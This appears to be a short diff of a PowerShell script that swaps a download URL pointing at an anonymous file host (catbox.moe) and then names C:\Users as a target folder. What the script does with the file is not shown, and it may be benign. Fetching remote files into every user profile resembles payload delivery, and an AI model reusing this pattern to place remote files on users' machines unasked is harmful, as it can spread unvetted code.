@@ -1,4 +1,4 @@
-$DownloadURL = "https://files.catbox.moe/6gruhh.png"
+$DownloadURL = "https://files.catbox.moe/h9aip5.png"
 
 $UsersFolder = "C:\Users"
 
